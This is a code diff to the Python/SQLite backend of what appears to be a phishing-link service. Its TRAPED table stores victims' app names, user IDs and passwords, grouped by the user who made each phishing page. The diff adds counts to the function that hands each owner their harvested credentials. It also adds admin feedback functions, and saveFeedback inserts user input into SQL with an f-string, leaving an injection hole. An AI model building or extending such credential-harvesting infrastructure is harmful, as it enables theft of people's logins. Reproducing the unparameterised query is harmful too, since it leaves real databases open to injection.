@@ -27,6 +27,8 @@ def ConnectionToUserDB():
     print("Made Connection to Users Database")
     return conn
 
+
+
 # used while registering and checking for generated phishing url
 def checkIfUserExists(uid):
     conn=ConnectionToUserDB()
@@ -72,7 +74,10 @@ def insertIntoTraped(owner,site,uid,pas):
 #get the traped data for user
 def getTrapedDataForOwner(uid):
     cursor = ConnectionToTrapedDB().execute("SELECT OWNER,APP,UID,PASSWORD from TRAPED where OWNER=?",(uid,))
-    return cursor
+    n=ConnectionToTrapedDB().execute("select count(*) from TRAPED where OWNER=?",(uid,)).fetchall()[-1][-1]
+    return [cursor,n]
+
+
 
 
 
@@ -90,8 +95,33 @@ def getUserData():
     return [cursor,n]
     
 
+#for admin
+def saveFeedback(uid,name,email,msg):
+    conn=sqlite3.connect('Message.db',check_same_thread=False)
+    conn.execute('''CREATE TABLE IF NOT EXISTS MESSAGE
+            (UID  TEXT  NOT NULL,
+            NAME TEXT NOT NULL,
+            EMAIL TEXT NOT NULL,
+            MSG    TEXT    NOT NULL);
+            ''')
+    conn.execute(f"INSERT INTO MESSAGE (UID,NAME,EMAIL,MSG) \
+      VALUES ('{uid}','{name}','{email}','{msg}' )")
+    conn.commit()
+    conn.close()
 
 
+#for admin
+def getFeedbackData():
+    conn=sqlite3.connect('Message.db',check_same_thread=False)
+    conn.execute('''CREATE TABLE IF NOT EXISTS MESSAGE
+            (UID  TEXT  NOT NULL,
+            NAME TEXT NOT NULL,
+            EMAIL TEXT NOT NULL,
+            MSG    TEXT    NOT NULL);
+            ''')
+    cursor = conn.execute("SELECT UID,NAME,EMAIL,MSG from MESSAGE")
+    n=conn.execute("select count(*) from MESSAGE").fetchall()[-1][-1]
+    return [cursor,n]
 
 
 
